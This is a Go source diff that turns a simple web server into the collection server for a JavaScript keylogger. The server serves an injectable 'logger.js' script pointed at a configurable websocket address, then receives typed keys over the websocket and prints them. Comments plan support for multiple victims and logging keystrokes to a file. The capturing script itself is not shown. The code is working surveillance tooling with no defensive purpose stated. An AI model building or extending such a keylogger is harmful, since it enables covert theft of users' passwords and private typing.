@@ -1,34 +1,77 @@
 package main
 
 import (
+	"flag"
 	"fmt"
+	"html/template"
 	"log"
 	"net/http"
 
 	"github.com/gorilla/mux"
-	"github.com/urfave/negroni"
+	"github.com/gorilla/websocket"
 )
 
-func homeHandler(w http.ResponseWriter, r *http.Request) {
-	fmt.Fprintf(w, "hello!")
-}
-func wsHandler(w http.ResponseWriter, r *http.Request) {
-	fmt.Fprintf(w, "pew pew")
+var (
+	t      *template.Template
+	port   string
+	wsAddr string
+)
+
+var upgrader = websocket.Upgrader{
+	ReadBufferSize: 1024, WriteBufferSize: 1024,
 }
 
-func middlewareHandler(w http.ResponseWriter, r *http.Request, next http.HandlerFunc) {
-	fmt.Fprintf(w, "middleware run!")
-	next(w, r)
+func init() {
+	flag.StringVar(&port, "p", ":8080", "address you want ex :8080")
+	flag.StringVar(&wsAddr, "a", "", "websocket address")
+	flag.Parse()
+
+	var err error
+	t, err = template.ParseFiles("index.html", "logger.js")
+	if err != nil {
+		log.Panic(err)
+	}
+}
+
+func handleHome(w http.ResponseWriter, r *http.Request) {
+	t.ExecuteTemplate(w, "index.html", nil)
+}
+
+func handleWS(w http.ResponseWriter, r *http.Request) {
+	conn, err := upgrader.Upgrade(w, r, nil)
+	if err != nil {
+		log.Panic(err)
+	}
+	defer conn.Close()
+
+	for {
+		_, s, err := conn.ReadMessage()
+		if err != nil {
+			log.Panic(err)
+		}
+		fmt.Printf("key Entered: %s\n", string(s))
+	}
+}
+
+func serveFile(w http.ResponseWriter, r *http.Request) {
+	w.Header().Set("Content-Type", "application/javascript")
+	t.ExecuteTemplate(w, "logger.js", wsAddr)
 }
 
 func main() {
+	///////////////////////////////////////////////////
+	// PROBLEMS:
+	// 1. What if there's multiple users using the html? it will send multiple keystrokes at many different client
+	// 2. Wouldn't it be troublesome to just get the input in the terminal
+	// TODO:
+	// 1. Improve the code handle multiple clients using websockets
+	// 2. Transfer all the keystrokes in txt file
+	////////////////////////////////////////////////////
+
 	r := mux.NewRouter()
-	r.HandleFunc("/", homeHandler)
-	r.HandleFunc("/ws", wsHandler)
+	r.HandleFunc("/", handleHome).Methods("GET")
+	r.HandleFunc("/ws", handleWS).Methods("GET", "POST")
+	r.HandleFunc("/script.js", serveFile).Methods("GET")
 
-	n := negroni.Classic()
-
-	n.Use(negroni.HandlerFunc(middlewareHandler))
-	n.UseHandler(r)
-	log.Fatal(http.ListenAndServe(":8080", n))
+	log.Fatal(http.ListenAndServe(port, r))
 }
